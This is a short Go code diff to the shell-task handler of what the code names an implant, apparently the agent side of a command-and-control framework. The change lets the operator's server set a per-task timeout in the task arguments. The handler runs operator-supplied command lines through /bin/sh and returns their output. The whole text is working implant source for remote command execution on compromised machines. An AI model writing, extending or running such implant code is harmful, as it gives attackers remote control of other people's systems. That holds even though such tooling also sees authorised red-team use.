@@ -130,7 +130,14 @@ func (b *Beacon) taskShell(args map[string]any) Outcome {
 	if runtime.GOOS == "windows" {
 		return Outcome{Code: 2, Err: "the shell task of this implant needs a POSIX shell"}
 	}
-	ctx, cancel := context.WithTimeout(context.Background(), taskTimeout)
+	// The operator may bound the work: the server puts the timeout in the
+	// arguments of the task, and the implant stops the command when it is
+	// out of time.
+	limit := taskTimeout
+	if secs := u64Or(args, "timeout", 0); secs > 0 {
+		limit = time.Duration(secs) * time.Second
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), limit)
 	defer cancel()
 	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", cmdline)
 	out, err := cmd.CombinedOutput()
